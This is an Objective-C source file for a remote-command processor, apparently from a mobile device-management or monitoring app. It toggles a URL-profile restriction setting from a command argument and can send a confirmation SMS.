/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  EnableURLProfileProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  19/07/2012, Benjawan Tanarattanakorn, Vervata Co., Ltd. All rights reserved.
 */


#import "EnableURLProfileProcessor.h"
#import "PrefRestriction.h"

@interface EnableURLProfileProcessor (private)
- (void) processEnableURLProfile;
- (BOOL) isValidFlag;
- (void) enableURLProfileException;
- (void) sendReplySMS;
@end

@implementation EnableURLProfileProcessor


/**
 - Method name:			initWithRemoteCommandData
 - Purpose:				This method is used to initialize the EnableURLProfileProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description:	self(EnableURLProfileProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"EnableURLProfileProcessor ---> initWithRemoteCommandData...");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}


#pragma mark RemoteCmdProcessor Methods

/**
 - Method name:			doProcessingCommand
 - Purpose:				This method is used to process the EnableURLProfileProcessor
 - Argument list and description: 
 - Return description:	No return type
 */

- (void) doProcessingCommand {
	DLog (@"EnableURLProfileProcessor ---> doProcessingCommand");
	if ([self isValidFlag]) {
		[self processEnableURLProfile];
	} else {
		[self enableURLProfileException];
	}
}


#pragma mark EnableURLProfileProcessor PrivateAPI Methods

/**
 - Method name:			processEnableURLProfile
 - Purpose:				This method is used to enable url profile
 - Argument list and description: No Argument
 - Return description:	No return type
 */
- (void) processEnableURLProfile{
	DLog (@"EnableURLProfileProcessor ---> processEnableURLProfile");
	
	NSUInteger flagValue = [[[mRemoteCmdData mArguments] objectAtIndex:2] intValue];
	DLog (@"flagValue: %d", flagValue)
	
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefRestriction *prefRestriction = (PrefRestriction *)[prefManager preference:kRestriction];
	[prefRestriction setMEnableUrlProfile:flagValue];
	[prefManager savePreferenceAndNotifyChange:prefRestriction];
	[self sendReplySMS];
}

/**
 - Method name:			isValidFlag
 - Purpose:				This method is used to validate the Arguments
 - Argument list and description:No Argument 
 - Return description:	isValidArguments (BOOL)
 */
- (BOOL) isValidFlag {
	DLog (@"EnableURLProfileProcessor ---> isValidFlag")
	BOOL isValid=NO;
	NSArray *args = [mRemoteCmdData mArguments];
	if ([args count] > 2) 
		isValid = [RemoteCmdProcessorUtils isZeroOrOneFlag:[args objectAtIndex:2]];	
	return isValid;
}

/**
 - Method name:			enableURLProfileException
 - Purpose:				This method is invoked when enabling URL profile is failed. 
 - Argument list and description: No Return Type
 - Return description:	No Argument
 */
- (void) enableURLProfileException {
	DLog (@"EnableURLProfileProcessor ---> enableURLProfileException")
	FxException* exception = [FxException exceptionWithName:@"enableURLProfileException" andReason:@"Enable URL Profile error"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name:			sendReplySMS
 - Purpose:				This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description:	No return type
 */
- (void) sendReplySMS {
	DLog (@"EnableURLProfileProcessor ---> sendReplySMS")
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *enableURLProfileMessage = NSLocalizedString(@"kEnableUrlProfileSucess", @"");
	if ([[[mRemoteCmdData mArguments] objectAtIndex:2] intValue] == 1) 
		enableURLProfileMessage = [enableURLProfileMessage stringByAppendingString:NSLocalizedString(@"kEnableUrlProfileCmdEnable", @"")];
	else 
    	enableURLProfileMessage = [enableURLProfileMessage stringByAppendingString:NSLocalizedString(@"EnableUrlProfileCmdDisable", @"")];
	
	enableURLProfileMessage = [messageFormat stringByAppendingString:enableURLProfileMessage];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:enableURLProfileMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:enableURLProfileMessage];
	}
}

/**
 - Method name:			dealloc
 - Purpose:				This method is used to Handle Memory managment
 - Argument list and description:	No Argument
 - Return description:	No Return Type
 */
- (void) dealloc {
	[super dealloc];
}

@end
